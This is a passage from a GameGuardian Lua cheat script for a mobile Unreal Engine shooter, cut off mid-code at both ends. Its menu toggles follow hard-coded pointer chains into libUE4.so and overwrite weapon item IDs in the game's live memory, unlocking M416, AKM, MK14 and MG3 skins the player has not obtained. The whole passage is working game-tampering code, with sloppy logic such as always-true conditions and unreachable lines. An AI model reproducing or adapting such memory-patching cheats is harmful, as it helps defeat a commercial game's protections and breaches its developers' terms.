setvalue(addr+0x18,4,qing[9])

end
if readD(addr+0x58) == 204013 then --AKM
setvalue(addr+0x18,4,qing[10])

end
if readD(addr+0x58) == 201010 then --AKM
setvalue(addr+0x18,4,qing[11])

end
if readD(addr+0x58) == 201009 then --AKM
setvalue(addr+0x18,4,qing[12])

end
if readD(addr+0x58) == 201011 then --AKMM416突击步枪默认弹匣 291004M416机械瞄具 203008M416默认枪托 205005
setvalue(addr+0x18,4,qing[13])

end
if readD(addr+0x58) == 202001 then --AKM
setvalue(addr+0x18,4,qing[14])

end
if readD(addr+0x58) == 202006 then 
setvalue(addr+0x18,4,qing[15])

end
if readD(addr+0x58) == 202002 then --AKM
setvalue(addr+0x18,4,qing[16])

end
if readD(addr+0x58) == 205002 then 
setvalue(addr+0x18,4,qing[17])
string.toMusic('开启成功')
break
end
end
end
end,
function()
string.toMusic('无法关闭')				
end),
changan.text("自选枪械美化专区","#00FF00","10sp"),--空文本可用于换行，sp调整距离
changan.switch("M416科技核心",
function()		
a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then

addListltems(add,4,0,false)
break
add=add
end
end

SK=0x4148
while(SK <=0x866E218)
do
SK=SK+0x18
addr=RUI(add+SK)

if readD(addr) == 20 or readD(addr) == 0 or readD(addr) or readD(addr) == 1 then
if readD(addr+0x58) == 101004 then --M4
setvalue(addr+0x18,4,1101004138 )
end

if readD(addr+0x58) == 203008 then --机瞄
setvalue(addr+0x18,4,1101004138 )
end

if readD(addr) == 1 or readD(addr) == 0 then
if readD(addr+0x58) == 205005 then --枪托
setvalue(addr+0x18,4,1101004138 )
end

if readD(addr+0x58) == 291004 then --弹夹
setvalue(addr+0x18,4,1101004138 )
string.toMusic('开启成功')
break
end
end
end
end
end,
function()

string.toMusic('关闭')				
end),
changan.switch("M416恶龙咆哮",
function()		
a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then

addListltems(add,4,0,false)
break
add=add
end
end

SK=0x4148
while(SK <=0x866E218)
do
SK=SK+0x18
addr=RUI(add+SK)

if readD(addr) == 20 or readD(addr) == 0 or readD(addr) or readD(addr) == 1 then
if readD(addr+0x58) == 101004 then --M4
setvalue(addr+0x18,4,1101004086)
end

if readD(addr+0x58) == 203008 then --机瞄
setvalue(addr+0x18,4,1101004086)
end

if readD(addr) == 1 or readD(addr) == 0 then
if readD(addr+0x58) == 205005 then --枪托
setvalue(addr+0x18,4,1101004086)
end

if readD(addr+0x58) == 291004 then --弹夹
setvalue(addr+0x18,4,1101004086)
string.toMusic('开启成功')
break
end
end
end
end
end,
function()
string.toMusic('关闭')				
end),
changan.switch("M416武魂宗师",
function()		
a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then

addListltems(add,4,0,false)
break
add=add
end
end

SK=0x4148
while(SK <=0x866E218)
do
SK=SK+0x18
addr=RUI(add+SK)

if readD(addr) == 20 or readD(addr) == 0 or readD(addr) or readD(addr) == 1 then
if readD(addr+0x58) == 101004 then --M4
setvalue(addr+0x18,4,1101004201)
end

if readD(addr+0x58) == 203008 then --机瞄
setvalue(addr+0x18,4,1010042012)
end

if readD(addr) == 1 or readD(addr) == 0 then
if readD(addr+0x58) == 205005 then --枪托
setvalue(addr+0x18,4,1010042013)
end

if readD(addr+0x58) == 291004 then --弹夹
setvalue(addr+0x18,4,1010042011)
string.toMusic('开启成功')
break
end
end
end
end
end,
function()
string.toMusic('关闭')				
end),
changan.switch("M416冰霜核心",
function()		
a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then

addListltems(add,4,0,false)
break
add=add
end
end

SK=0x4148
while(SK <=0x866E218)
do
SK=SK+0x18
addr=RUI(add+SK)

if readD(addr) == 20 or readD(addr) == 0 or readD(addr) or readD(addr) == 1 then
if readD(addr+0x58) == 101004 then --M4
setvalue(addr+0x18,4,1101004046)
end

if readD(addr+0x58) == 203008 then --机瞄
setvalue(addr+0x18,4,1101004046)
end

if readD(addr) == 1 or readD(addr) == 0 then
if readD(addr+0x58) == 205005 then --枪托
setvalue(addr+0x18,4,1101004046)
end

if readD(addr+0x58) == 291004 then --弹夹
setvalue(addr+0x18,4,1101004046)
string.toMusic('开启成功')
break
end
end
end
end
end,
function()
string.toMusic('关闭')				
end),
changan.switch("AKM冰霜核心",
function()		
a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then

addListltems(add,4,0,false)
break
add=add
end
end

SK=0x4148
while(SK <=0x866E218)
do
SK=SK+0x18
addr=RUI(add+SK)

if readD(addr) == 20 or readD(addr) == 0 or readD(addr) or readD(addr) == 1 then
if readD(addr+0x58) == 101001 then
setvalue(addr+0x18,4,1101001213)
string.toMusic('开启成功')
break
end
end
end
end,
function()
string.toMusic('关闭')				
end),
changan.text("地铁美化专区","#00FF00","10sp"),--空文本可用于换行，sp调整距离
changan.switch("红白妹控",
function()		
local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(MK14星云力量.).lua'
	local chunk = loadfile(cfg_file)
	local cfg = nil
	if chunk ~= nil then
		cfg = chunk()
	end
	gg.alert("正在遍历 请耐心等待 有提示后再开别的")

a=0x0
while(a <=0xAF0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)--动态DD900
adpd = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x30) +0x18
if readD(adpd) == 1000 then
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0x5000--3FF8初始
while(nmsl <=0x80000)--10850最大
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
if readD(addr+0x58) == 1030074 then ---
setvalue(addr+0x18,4,1103007010)
end

if readD(addr+0x58) == 1030075 then ---
setvalue(addr+0x18,4,1103007010)

end
if readD(addr+0x58) == 1030076 then---
setvalue(addr+0x18,4,1103007010)

end
if readD(addr+0x58) == 1030077 then ---
setvalue(addr+0x18,4,1103007010)
string.toMusic('开启成功')
break
end
end
end,
function()
string.toMusic('关闭')				
end),
changan.switch("钢铁丛林妹控",
function()		
local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(MK14星云力量.).lua'
	local chunk = loadfile(cfg_file)
	local cfg = nil
	if chunk ~= nil then
		cfg = chunk()
	end
	gg.alert("正在遍历 请耐心等待 有提示后再开别的")
a=0x0
while(a <=0xAF0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)--动态DD900
adpd = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x30) +0x18
if readD(adpd) == 1000 then
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0x5000--3FF8初始
while(nmsl <=0x80000)--10850最大
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
if readD(addr+0x58) == 1030074 then ---
setvalue(addr+0x18,4,1103007011)
end

if readD(addr+0x58) == 1030075 then ---
setvalue(addr+0x18,4,1103007011)

end
if readD(addr+0x58) == 1030076 then---
setvalue(addr+0x18,4,1103007011)

end
if readD(addr+0x58) == 1030077 then ---
setvalue(addr+0x18,4,1103007011)
string.toMusic('开启成功')
break
end
end
end,
function()
string.toMusic('关闭')				
end),
changan.switch("灰白妹控",
function()		
local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(MK14星云力量.).lua'
	local chunk = loadfile(cfg_file)
	local cfg = nil
	if chunk ~= nil then
		cfg = chunk()
	end
	gg.alert("正在遍历 请耐心等待 有提示后再开别的")
a=0x0
while(a <=0xAF0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)--动态DD900
adpd = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x30) +0x18
if readD(adpd) == 1000 then
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0x5000--3FF8初始
while(nmsl <=0x80000)--10850最大
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
if readD(addr+0x58) == 1030074 then ---
setvalue(addr+0x18,4,1103007015)
end

if readD(addr+0x58) == 1030075 then ---
setvalue(addr+0x18,4,1103007015)

end
if readD(addr+0x58) == 1030076 then---
setvalue(addr+0x18,4,1103007015)

end
if readD(addr+0x58) == 1030077 then ---
setvalue(addr+0x18,4,1103007015)
string.toMusic('开启成功')
break
end
end
end,
function()
string.toMusic('关闭')				
end),
changan.switch("mk14美化",
function()				
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白地铁一套.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1010040462,1010040463,1103007020,1010040461,1101004046, true}
end
xing = gg.prompt({
"瞄具:",
"枪托:",
"mk14改进",
"mk14精致:",
"枪托:",
"m4修复",
},cfg,{"text","text","text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end



a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("遍历完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
if readD(addr+0x58) == 203008 then --AKM
setvalue(addr+0x18,4,xing[1])
end
if readD(addr+0x58) == 205005 then --AKMM416突击步枪默认弹匣 291004M416机械瞄具 203008M416默认枪托 205005
setvalue(addr+0x18,4,xing[2])
end
if readD(addr+0x58) == 1030074 then --AKM
setvalue(addr+0x18,4,xing[3])
end
if readD(addr+0x58) == 1030075 then --AKMM416突击步枪默认弹匣 291004M416机械瞄具 203008M416默认枪托 205005
setvalue(addr+0x18,4,xing[4])
end
if readD(addr+0x58) == 291004 then --AKM
setvalue(addr+0x18,4,xing[5])
end
if readD(addr+0x58) == 1010042 then --AKM
setvalue(addr+0x18,4,xing[6])
gg.alert("开启成功")

break
end
end
end
end,
function()





if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白地铁一套.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1010040462,1010040463,1103007020,1010040461,1101004046, true}
end
xing = gg.prompt({
"瞄具:",
"枪托:",
"mk14改进",
"mk14精致:",
"枪托:",
"m4修复",
},cfg,{"text","text","text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end



a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("遍历完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
if readD(addr+0x58) == 203008 then --AKM
setvalue(addr+0x18,4,xing[1])
end
if readD(addr+0x58) == 205005 then --AKMM416突击步枪默认弹匣 291004M416机械瞄具 203008M416默认枪托 205005
setvalue(addr+0x18,4,xing[2])
end
if readD(addr+0x58) == 1030074 then --AKM
setvalue(addr+0x18,4,xing[3])
end
if readD(addr+0x58) == 1030075 then --AKMM416突击步枪默认弹匣 291004M416机械瞄具 203008M416默认枪托 205005
setvalue(addr+0x18,4,xing[4])
end
if readD(addr+0x58) == 291004 then --AKM
setvalue(addr+0x18,4,xing[5])
end
if readD(addr+0x58) == 1010042 then --AKM
setvalue(addr+0x18,4,xing[6])
gg.alert("开启成功")

break
end
end
end
end,
									
							function()

toMusic('关闭成功')---语音
end),				

changan.switch("mk14自改美化",
function()				
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械地铁mk14.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1103007020 ,1103007020 ,1103007020 , 1103007020 , 1103007020 ,1103007020 ,1103007020, true}
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"钢铁",--6
"独眼",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1030071 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1030072 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1030073 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1030074 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1030075 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 1030076 then --AKM
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 1030077 then --AKM
setvalue(addr+0x18,4,xing[7])
gg.alert("开启成功")

break
end
end
end
end,
function()
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械地铁mk14.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1103007020 ,1103007020 ,1103007020 , 1103007020 , 1103007020 ,1103007020 ,1103007020, true}
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"钢铁",--6
"独眼",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1030071 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1030072 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1030073 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1030074 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1030075 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 1030076 then --AKM
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 1030077 then --AKM
setvalue(addr+0x18,4,xing[7])

gg.alert("开启成功")
break
end
end
end

end,
									
							function()

toMusic('关闭成功')---语音
end),				

changan.switch("M416自改美化",
function()				
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械地铁m416.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1101004046 ,1101004046 ,1101004046 , 1101004046 , 1101004046 ,1101004046 ,1101004046, true}
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"钢铁",--6
"独眼",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end
nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1010041 then --AKM
setvalue(addr+0x18,4,xing[1])
end
if readD(addr+0x58) == 1010042 then --AKM
setvalue(addr+0x18,4,xing[2])
end
if readD(addr+0x58) == 1010043 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1010044 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1010045 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 1010046 then --AKM
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 1010047 then --AKM
setvalue(addr+0x18,4,xing[7])

gg.alert("开启成功")
break
end
end
end
end,
function()
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械地铁m416.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1101004046 ,1101004046 ,1101004046 , 1101004046 , 1101004046 ,1101004046 ,1101004046, true}
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"钢铁",--6
"独眼",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1010041 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1010042 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1010043 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1010044 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1010045 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 1010046 then --AKM
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 1010047 then --AKM
setvalue(addr+0x18,4,xing[7])
gg.alert("开启成功")
break
end
end
end
end,
									
							function()

toMusic('关闭成功')---语音
end),

changan.switch("m416配件自改美化",
function()				
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械m4配件.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1010040462,1010040461,1010040463, true}
end
xing = gg.prompt({
"瞄具:",
"枪托:",
"弹夹",
},cfg,{"text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end



a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 203008 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 205005 then --AKMM416突击步枪默认弹匣 291004M416机械瞄具 203008M416默认枪托 205005
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 291004 then --AKM
setvalue(addr+0x18,4,xing[3])
gg.alert("开启成功")

break
end
end
end
end,
									
							function()

toMusic('关闭成功')---语音
end),

changan.switch("MG3自改美化",
function()				
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械地铁mk47.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1105010008 ,1105010008 ,1105010008 ,1105010008 ,1105010008 ,1105010008 ,1105010008, true}--苍穹之龙-MG3(5级) 1105010008
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"枪托",--6
"瞄具",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC40E900) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC40E900) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1050101 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1050102 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1050103 then --AKM
setvalue(addr+0x18,4,xing[3])

end
if readD(addr+0x58) == 1050104 then --AKM
setvalue(addr+0x18,4,xing[4])

end
if readD(addr+0x58) == 1050105 then --AKM
setvalue(addr+0x18,4,xing[5])

end
if readD(addr+0x58) == 205008 then --AKMMK47默认枪托 205008Mk47机械瞄具 203016
setvalue(addr+0x18,4,xing[6])

end
if readD(addr+0x58) == 203016 then --AKM
setvalue(addr+0x18,4,xing[7])

gg.alert("开启成功")
break
end
end
end
end,
function()
if not gg.getRangesList(("libUE4.so")) or #gg.getRangesList(("libUE4.so")) == 0 then
os.exit(print(("so模块不存在 libUE4.so 请检查游戏进程是否正确？")))
end

local cfg_file = gg.EXT_FILES_DIR.."/"..gg.getFile():match("[^/]+$")..'(息白枪械地铁mk47.).lua'
local chunk = loadfile(cfg_file)
local cfg = nil
if chunk ~= nil then
 cfg = chunk()
end
if cfg == nil then
cfg = {1105010008 ,1105010008 ,1105010008 ,1105010008 ,1105010008 ,1105010008 ,1105010008, true}--苍穹之龙-MG3(5级) 1105010008
end
xing = gg.prompt({
"破损:",
"修复:",
"完好",
"改进:",--4
"精致:",--5
"枪托",--6
"瞄具",--7
},cfg,{"text","text","text", "text","text","text","text"})
if xing == nil then else
gg.saveVariable(xing, cfg_file)
if xing[1] == true then xsnb1() end
if xing[2] == true then xsnb2() end
if xing[3] == true then xsnb3() end
if xing[4] == true then xsnb4() end
if xing[5] == true then xsnb5() end
if xing[6] == true then xsnb6() end
if xing[7] == true then xsnb7() end


a=0x0
while(a <=0xAB0)
do
a=a+0x10
mk=gg.getRangesList('libUE4.so')[1].start
add = RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38)
adpd = RUI(RUI(RUI(RUI(RUI(RUI(mk + 0xC656D90) + 0x558) + a) + 0x30) + 0x38) +0x8) +0x18
if readD(adpd) == 1000 then
gg.alert("第一部完成")
addListltems(add,4,0,false)
break
add=add
end
end

nmsl=0xDD30
while(nmsl <=0x866E218)
do
nmsl=nmsl+0x18
addr=RUI(add+nmsl)
----------xsnb666
if readD(addr+0x58) == 1050101 then --AKM
setvalue(addr+0x18,4,xing[1])

end
if readD(addr+0x58) == 1050102 then --AKM
setvalue(addr+0x18,4,xing[2])

end
if readD(addr+0x58) == 1050103 then --AKM
setvalue(addr+0x18,4,xing[3])

end
